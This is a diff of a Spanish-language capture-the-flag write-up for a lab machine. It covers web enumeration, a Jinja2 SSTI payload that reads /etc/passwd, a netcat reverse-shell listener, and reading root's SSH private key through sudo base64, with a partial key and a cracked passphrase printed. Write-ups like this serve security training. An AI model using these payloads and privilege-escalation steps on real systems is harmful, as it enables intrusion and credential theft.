@@ -61,13 +61,8 @@ PORT     STATE SERVICE REASON         VERSION
 - Puerto 80 HTTP: Apache httpd 2.4.59
 - Puerto 8089: No pudo detectar el servicio que corre 
 
-Utilice whatweb para ver que otra informacion podía obtener del puerto 8089 que al parecer es una pagina web
-```bash
-> whatweb http://172.17.0.2:8089/
-http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
-```
 
-- Corre con Python
+
 ## Enumeración
 
 **Puerto 80**
@@ -76,23 +71,31 @@ http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.
 
 **Puerto 8089**
 
-- Whatweb: Identifica que corre con Python
+Al momento de acceder por el navegador al puerto 8089 me encuentro con una pagina web. Por lo cual decido usar whatweb para identificar que tecnologías corre por detras.
+
+- La web corre con Python 3.11.2 
+```bash
+> whatweb http://172.17.0.2:8089/
+http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
+```
+
 ![](../assets/Pasted image 20251110165559.png)
-- El input del usuario se ve reflejado en otra tab:
-- El parametro ?user= si lo cambiamos también se ve reflejado en la web
+
+- Probando la app me doy cuenta que el input del usuario se ve reflejado en la web.
+- El parametro ?user= si lo cambiamos también se ve reflejado en la web.
 ![](../assets/Pasted image 20251110165824.png)
 
 Sabiendo que la web corre en python y el input del usuario se ve reflejado y es lo único que cambia de manera dinámica en la web, esto me hace pensar que puede que por detrás haya un framework como Flask o Django que emplee algún motor plantillas cono Jinja2 u otro que pueda ser vulnerable a SSTI.
 
 ## Explotación
 
-Lo primero que intentamos fue cambiar el parametro `?user=` por una operatoria simple para comprobar si la web la realizaba correctamente y lo reflejaba.
+Lo primero que intentamos fue cambiar el parametro `?user=` por una operatoria simple para comprobar si la web la interpretaba y realizaba correctamente.
 
 `{{7*7}}`
 
 ![](../assets/Pasted image 20251110170230.png)
 
-Ahora sabiendo que en efecto la web es vulnerable a SSTI y que corre en Python mi primer approach fue buscar payloads en PayloadAllThings que me permitieran leer archivos internos como /etc/passwd que sirvieran para el motor de plantillas de Jinja2.
+Ahora sabiendo que en efecto la web es vulnerable a SSTI y que corre en Python mi primer approach fue buscar payloads que me permitieran leer archivos internos como /etc/passwd que sirvieran para el motor de plantillas de Jinja2.
 ```python
 > {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
@@ -108,7 +111,12 @@ Ahora procedí a denuevo buscar algún payload pero ahora que me permitiera enta
 
 ![](../assets/Pasted image 20251110171843.png)
 
-Me conecto con éxito
+Me pongo en escucha:
+```bash
+> sudo nc -nlvp 443
+```
+
+Ejecuto el payload y obtengo acceso.
 ```bash
 verde@d56c80ae05a3:~$ whoami
 verde
@@ -117,7 +125,7 @@ uid=1000(verde) gid=1000(verde) groups=1000(verde)
 ```
 ## Escalada de Privilegios
 
-Dentro del sistema lo primero que hago es listar los binarios que puedo ejecutar como root y me encuentro esto
+Dentro del sistema lo primero que hago es enumerar los binarios con privilegios de SUDO o algun otro usuario.
 
 - Binario bas64
 
@@ -127,9 +135,10 @@ User verde may run the following commands on d56c80ae05a3:
     (root) NOPASSWD: /usr/bin/base64
 ```
 
-Sabiendo que puedo ejecutar base64 como root básicamente puedo codificar - decodificar lo que me de la gana. Lo primero que intente fue leer `/etc/shadow` (hashes de contraseñas) pero no obtuve nada interesante
 
-Entonces lo segundo que se me ocurre es que el puerto 22 esta abiertos por lo cual puede que el usuario root tenga una clave rsa.
+Anteriormente en la fase de reconocimiento descubrimos que el puerto 22 estaba abierto.
+
+Entonces es posible que el usuario root tenga una clave `rsa` a la cual yo puedo acceder aprovechandome del binario `base64`. Bascimante voy a codificar la clave y decodificarla como el usario root.
 ```bash
 > sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
 sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
@@ -139,8 +148,9 @@ r68d1eRBMAoL1IAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDbTQGZZWBB
 VRdf31TPoa0wcuFMcqXJhxfX9HqhmcePAyZMxtgChQzYmmzRgkYH6jBTXSnNanTe4A0KME
 ```
 
-Procedo a guardarme la clave en mi sistema y darle permisos
-- Al parecer pide un passphrase
+Ahora procedo a guardarme la clave en mi sistema y darle permisos
+
+- Aqui me doy cuenta de que tiene contraseña
 ```bash
 > chmod 600 root-key
 > ssh -i root-key root@172.17.0.2
@@ -156,6 +166,8 @@ root-key:honda1
 ```
 
 ![](../assets/Pasted image 20251110175319.png)
+
+- Encuentro la clave: root-key:honda1
 
 Ahora simplemente me conecto con la clave rsa y contraseña
 ```bash
